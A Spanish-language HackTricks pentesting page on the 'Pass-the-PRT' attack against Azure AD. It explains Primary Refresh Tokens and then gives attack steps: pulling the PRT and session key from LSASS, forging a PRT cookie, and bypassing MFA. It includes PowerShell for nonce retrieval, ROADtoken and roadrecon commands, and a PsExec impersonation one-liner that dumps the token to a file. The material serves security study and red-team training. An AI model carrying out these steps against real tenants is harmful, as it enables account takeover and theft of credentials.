# Az - Pasar el PRT

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## ¿Qué es un PRT?

Un **Primary Refresh Token (PRT)** se utiliza para proporcionar una experiencia de **inicio de sesión único (SSO)** para los usuarios de Windows 10 y sistemas operativos móviles.

Cuando inicias sesión en un dispositivo que admite este SSO, Windows se **comunica con el proveedor de autenticación en la nube, valida** tus credenciales y **devuelve** el **PRT y una clave de sesión**. El **PRT se almacena en LSASS**, y la **clave de sesión se vuelve a cifrar** con el TPM local del dispositivo y luego se almacena junto con el PRT.

Luego, cuando el **navegador** intenta acceder a recursos en la nube, se utiliza una **cookie PRT** para acceder a ellos.

Una vez emitido, un **PRT** es **válido** durante **14 días** y se **renueva continuamente** siempre que el usuario use activamente el dispositivo. Un PRT solo tiene **reclamaciones MFA** si al acceder a RDP se utiliza **Windows Hello** o **Windows Account Manager**.

Se puede utilizar para obtener tokens de acceso y actualización para cualquier aplicación.

Para obtener más información sobre cómo funciona esto, lee la [**documentación**](https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token) o [**esta página**](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/).

### Comprobar si tienes un PRT

```
Dsregcmd.exe /status
```

En la sección Estado de SSO, deberías ver que **`AzureAdPrt`** está establecido en **YES**.

<figure><img src="../../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>

En la misma salida, también puedes ver si el **dispositivo está unido a Azure** (en el campo `AzureAdJoined`):

<figure><img src="../../../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>

## Pasar el PRT

### Pasos

1. **Extraer** el **PRT de LSASS** y guardarlo para más tarde.
2. **Extraer** la **clave de sesión**. Si recuerdas, esto se emite y luego se cifra de nuevo por el dispositivo local, por lo que necesitamos **descifrar esto usando una clave maestra DPAPI**. Para obtener más información sobre DPAPI, consulta este enlace de [**HackTricks**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) o el ataque de [**Pass-the-cookie**](az-pass-the-cookie.md).
3. Usando la clave de sesión descifrada, obtendremos la clave derivada para el PRT y el contexto. Esto es necesario para **crear nuestra cookie PRT**. La clave derivada es lo que se utiliza para firmar el JWT para la cookie. Dirk-jan hizo un gran trabajo explicando este proceso [aquí](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/).

Ahora tenemos todo lo que necesitamos para firmar nuestras propias cookies PRT y el resto de estos pasos se pueden hacer desde cualquier otro sistema.

* Usaremos el PRT, la clave derivada y el contexto para crear una nueva cookie PRT.
* Importa la cookie en tu sesión del navegador (usaremos Chrome)
* ¡Eso es todo! Ahora deberías estar autenticado como ese usuario sin tener que conocer su contraseña o manejar ninguna solicitud de MFA.

### Ataque - Roadtoken

Para obtener más información sobre esta forma, [**consulta esta publicación**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/). Para generar una cookie PRT válida, lo primero que necesitas es un nonce.\
Puedes obtener esto con:

```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
    "URI"     = $URL
    "Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```

O usando [**roadrecon**](https://github.com/dirkjanm/ROADtools):

```powershell
roadrecon auth prt-init
```

Luego puedes usar [**roadtoken**](https://github.com/dirkjanm/ROADtoken) para obtener un nuevo PRT (ejecútalo en la herramienta desde un proceso del usuario a atacar):

```powershell
.\ROADtoken.exe <nonce>
```

Como un solo comando:

{% code overflow="wrap" %}
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

Luego puedes usar la **cookie generada** para **generar tokens** para **iniciar sesión** usando Azure AD **Graph** o Microsoft Graph:
## Referencias

* Este post fue en su mayoría extraído de [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver a **tu empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>